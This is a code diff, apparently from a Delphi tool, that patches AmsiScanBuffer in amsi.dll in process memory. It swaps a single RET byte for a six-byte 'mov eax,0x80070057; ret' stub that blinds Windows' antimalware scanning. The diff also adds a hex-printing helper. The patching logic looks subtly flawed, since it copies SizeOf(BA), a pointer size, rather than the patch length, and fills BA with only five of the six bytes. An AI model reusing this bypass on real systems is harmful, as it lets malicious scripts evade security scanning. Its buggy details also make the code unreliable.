@@ -9,12 +9,17 @@ https://www.sunshine2k.de/articles/coding/tut_Patcher.htm
 https://progamercity.net/delphi/245-delphi-memory-modification-tutorial-amp-template.html
 https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
 https://delphi.cjcsoft.net/viewthread.php?tid=42761&extra=page%3D1
+https://www.askingbox.com/tip/delphi-lazarus-show-byte-array-as-string-of-hex-values
 }
 
 uses
   System.SysUtils,
   Windows
   ;
+
+
+type
+  TByteArr = array of Byte;
 
 var
   PidHandle: integer;
@@ -25,7 +30,10 @@ var
   NumWrote : SIZE_T;
   //OldProtect : DWord;
   OldProtect : DWord;
-  RET : Byte = $C3;
+  //PATCH : Byte = $C3;
+  PATCH : array[0..5] of Byte = ($B8, $57, $00, $07, $80, $C3);
+  BA: TByteArr;
+
 
 
 
@@ -35,6 +43,24 @@ var
 //Step past Protect,Patch,ReProtect
 //Save bin of amsi.dll in memory
 //$(cmp pre-patch.bin post-patch.bin)
+
+function ByteArrayToHexString(BA: TByteArr; Sep: string = ''): string;
+var
+  i, k: integer;
+begin
+  result:='';
+
+  if Sep='' then begin
+     for i:=low(BA) to high(BA) do
+       result := result + IntToHex(BA[i], 2);
+  end else begin
+     k:=high(BA);
+     for i:=low(BA) to k do begin
+        result:= result + IntToHex(BA[i], 2);
+        if k<>i then result := result + Sep;
+     end;
+  end;
+end;
 
 
 begin
@@ -54,8 +80,16 @@ begin
     WriteLn('[+] RWX protected');
 
   //Write to memory @ pter
-    WriteLn('[+] Patching with RET (0xC3) of length ', SizeOf(RET));
-    Move(RET, asb^, 1);
+    SetLength(BA,5);
+    BA[0] := PATCH[0];
+    BA[1] := PATCH[1];
+    BA[2] := PATCH[2];
+    BA[3] := PATCH[3];
+    BA[4] := PATCH[4];
+
+    WriteLn('[+] Patching with PATCH ', ByteArrayToHexString(BA,' '), ' of length ', SizeOf(PATCH));
+    Move(PATCH, asb^, SizeOf(BA));
+
 
     //WriteProcessMemory(PidHandle, asb, @garbage, SizeOf(garbage), Written);
     WriteLn('[+] Written RET To the start of ScanStringBuffer');
